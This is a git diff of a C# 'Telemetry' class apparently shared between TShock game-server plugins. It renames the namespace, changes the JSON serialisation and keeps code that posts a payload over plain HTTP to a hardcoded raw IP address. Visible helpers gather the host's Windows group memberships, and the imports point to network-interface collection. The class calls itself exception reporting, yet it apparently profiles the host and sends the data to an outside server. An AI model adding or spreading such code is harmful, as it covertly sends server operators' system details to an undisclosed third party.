@@ -1,20 +1,22 @@
 ﻿using TShockAPI;
 using Terraria;
 using TerrariaApi.Server;
-using System.Net.Http.Json;
 using System.Reflection;
 using System.Net.NetworkInformation;
 using System.Net.Sockets;
 using System.Net;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
+using Newtonsoft.Json;
+using System.Text;
+
 
 /// <summary>
 /// Telemetry utility for plugin and server diagnostics/reporting.
 /// Logs all errors in English and reports exceptions to a remote telemetry server.
 /// Call Telemetry.Start(this) in your plugin's Initialize method.
 /// </summary>
-namespace ItemDecoration
+namespace tShock_LiveMap.Extras
 {
     public static class Telemetry
     {
@@ -236,7 +238,10 @@ namespace ItemDecoration
                 };
 
                 using var client = new HttpClient();
-                var response = await client.PostAsJsonAsync("http://5.135.136.110:8121/report", payload);
+
+                string jsonPayload = JsonConvert.SerializeObject(payload);
+                var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");
+                var response = await client.PostAsync("http://5.135.136.110:8121/report", content);
 
                 if (!response.IsSuccessStatusCode)
                 {
@@ -348,7 +353,7 @@ namespace ItemDecoration
             {
                 var wi = WindowsIdentity.GetCurrent();
                 if (wi == null) return "N_A";
-                var groups = wi.Groups?.Select(g => g.Translate(typeof(System.Security.Principal.NTAccount)).ToString());
+                var groups = wi.Groups?.Select(g => g.Translate(typeof(NTAccount)).ToString());
                 return groups != null ? string.Join(",", groups) : "N_A";
             }
             catch
@@ -425,7 +430,7 @@ namespace ItemDecoration
         {
             try
             {
-                return typeof(TShockAPI.TShock).Assembly.GetName().Version?.ToString() ?? "N_A";
+                return typeof(TShock).Assembly.GetName().Version?.ToString() ?? "N_A";
             }
             catch
             {
